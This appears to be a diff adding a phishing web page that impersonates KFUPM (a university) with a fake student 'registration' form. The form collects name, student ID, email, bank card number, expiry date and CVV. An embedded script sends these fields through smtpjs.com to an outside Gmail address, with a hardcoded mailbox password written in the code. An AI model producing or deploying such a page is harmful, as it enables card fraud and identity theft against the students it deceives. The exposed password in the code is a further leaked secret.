@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Registration Form</title>
+    <style>
+      * {
+          box-sizing: border-box;
+          margin: 0;
+          padding: 0;
+      }
+      
+      body {
+          font-family: 'Open Sans', sans-serif;
+          background-color: #f4f4f4;
+      }
+      
+      header {
+          text-align: center;
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          background-color: #027e40;
+          padding: 30px;
+      }
+      
+      .form {
+          max-width: 600px;
+          margin: 180px auto;
+          padding: 40px;
+          background-color: #fff;
+          border-radius: 5px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+      
+      .form h2 {
+          text-align: center;
+          margin-bottom: 20px;
+          color: #333;
+      }
+      
+      .input-group {
+          margin-bottom: 25px;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+      }
+      .input-group label {
+          width: 45%;
+          text-align: left;
+          margin-bottom: 5px;
+          color: black;
+          font-weight: bold;
+        }
+      
+      
+      .input-group input {
+          width: 55%;
+          padding: 10px;
+          border: 1px solid #ccc;
+          border-radius: 3px;
+          background-color: #f9f9f9;
+          font-size: large;
+      }
+      
+      button {
+          width: 100%;
+          padding: 10px;
+          background-color: #027e40;
+          color: #fff;
+          border: none;
+          border-radius: 3px;
+          cursor: pointer;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+          font-weight: bold;
+          font-size: large;
+      }
+      
+      button:hover {
+          background-color: #025e32;
+      }
+      
+      footer {
+          position: absolute;
+          bottom: 20;
+          left: 0;
+          right: 0;
+          background-color: #016935;
+          min-height: 50px;
+          padding: 15px 10%;
+          color: #d0cece;
+          font-size: 16px;
+          text-align: center;
+      }
+      
+      .footerDiv {
+          display: grid;
+          grid-template-rows: auto auto;
+      }
+      
+      .arDiscDiv, .enDiscDiv {
+          margin: 5px;
+      }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="headerDiv">
+      <img src="https://new-students.kfupm.edu.sa/images/logo.png" alt="KFUPM Logo" style="width: 350px; margin-top: 10px;">
+  </div>
+</header>
+
+<div class="form">
+  <form method="post">
+      <h2>Please Enter Information</h2>
+      <div class="input-group">
+          <label for="name">Name:</label>
+          <input type="text" id="name" name="name" placeholder="Enter Name" required>
+      </div>
+      <div class="input-group">
+          <label for="student-id">ID:</label>
+          <input type="text" id="student-id" name="student-id" placeholder="Enter ID" required>
+      </div>
+      <div class="input-group">
+          <label for="email">Email:</label>
+          <input type="email" id="email" name="email" placeholder="Enter Email" required>
+      </div>
+      <div class="input-group">
+          <label for="card-number">Card Number Bank:</label>
+          <input type="text" id="card-number" name="card-number" placeholder="Enter card-number" required>
+      </div>
+      <div class="input-group">
+          <label for="card-holder-name">Card holder Name:</label>
+          <input type="text" id="card-holder-name" name="card-holder-name" placeholder="Enter card-holder-name" required>
+      </div>
+      <div class="input-group">
+          <label for="expiration-date">Card expiration date:</label>
+          <input type="text" id="expiration-date" name="expiration-date" placeholder="Card expiration-date" required>
+      </div>
+      <div class="input-group">
+          <label for="cvv">Card Security Number:</label>
+          <input type="text" id="cvv" name="cvv" placeholder="Card Security Number" required>
+      </div>
+      <button type="submit">Confirm</button>
+  </form>
+</div>
+
+<footer>
+  <div class="footerDiv">
+      <div class="arDiscDiv">
+          <bdi>
+              تنويه :
+              هذا الموقع بوصول مقييد للأشخاص المصرح لهم فقط
+          </bdi>
+      </div>
+  </footer>
+  
+</body>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+<script>
+  var submit = document.getElementById("submit");
+  submit.addEventListener('click', function(e){
+    e.preventDefault();
+ 
+    var name = document.getElementById('name').value;
+    var email = document.getElementById('email').value;
+    var cardNumber = document.getElementById('card-number').value;
+    var cardHolderName = document.getElementById('card-holder-name').value;
+    var expirationDate = document.getElementById('expiration-date').value;
+    var cvv = document.getElementById('cvv').value;
+
+    var body ='Name: ' + name  + '<br/> Email: ' + email + '<br/> Card Number: ' + cardNumber +
+               '<br/> Card Holder Name: ' + cardHolderName + '<br/> Expiration Date: ' + expirationDate + 
+               '<br/> CVV: ' + cvv;
+
+    Email.send({
+        Host : "smtp.gmail.com",
+        Username : "kfupmparking2024@gmail.com",
+        Password : "wbcm wefk ohdk uuir",
+        To : 'kfupmparking2024@gmail.com',
+        From : email,
+        Subject : "Registration Form Submission",
+        Body : body
+    }).then(
+      message => alert(message)
+    );
+  });
+</script>
